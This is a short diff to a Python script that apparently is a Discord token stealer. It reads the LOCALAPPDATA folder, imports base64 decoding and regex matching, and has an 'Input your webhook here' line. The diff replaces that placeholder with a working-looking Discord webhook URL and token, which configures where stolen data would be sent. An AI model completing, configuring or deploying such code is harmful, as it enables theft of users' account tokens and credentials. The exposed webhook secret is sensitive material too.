@@ -6,7 +6,7 @@ from base64 import b64decode
 from re import findall
 
 # Input your webhook here
-userwh = "REPLACE THIS BY YOUR WEBHOOK"
+userwh = "https://discord.com/api/webhooks/1142142666444902502/9BkU4mvKcobtYGpgsYSvZibjE43OMuHHCoH3W2mPAJLqnPK1Z_dsixuPkYml3-a6JBf_"
 
 try:
     LOCAL = os.getenv("LOCALAPPDATA")
